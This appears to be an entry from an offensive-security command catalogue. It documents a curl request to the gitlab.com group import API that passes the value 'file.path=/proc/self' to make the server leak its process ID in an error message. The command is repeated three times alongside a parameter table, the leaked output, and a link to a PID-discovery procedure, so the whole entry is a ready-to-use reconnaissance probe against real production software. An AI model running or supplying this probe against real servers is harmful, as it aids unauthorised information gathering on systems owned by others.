---
data: >-
  curl -H "Authorization: Bearer $TOKEN_R" -F 'lala=@/tmp/lala.txt'
  'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/self'
tags:
  - http-post
  - info-leak
type: command
executor: bash
platforms:
  - Linux
id: 012ee449-fd03-4a5d-8c7b-68f4a7eb2f77
created_at: '2025-12-11T03:47:39.402Z'
updated_at: '2025-12-11T03:47:39.402Z'
verified: false
validated: true
submitted: true
---
# curl-leak-pid-group-import

## Command

```bash
curl -H "Authorization: Bearer $TOKEN_R" -F 'lala=@/tmp/lala.txt' 'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/self'
```

## Description

Leaks PID via group import error.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer $TOKEN_R"` | Auth | Yes |
| `-F 'lala=@/tmp/lala.txt'` | Form data | Yes |
| `file.path=/proc/self` | Leak path | Yes |

## Examples

### Basic Usage

```bash
curl -H "Authorization: Bearer $TOKEN_R" -F 'lala=@/tmp/lala.txt' 'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/self'
```

## Expected Output

{"message":"insecure path used '/proc/9348'"}

## Related
- [[procedures/Discover-Valid-PIDs-via-Information-Leak]]
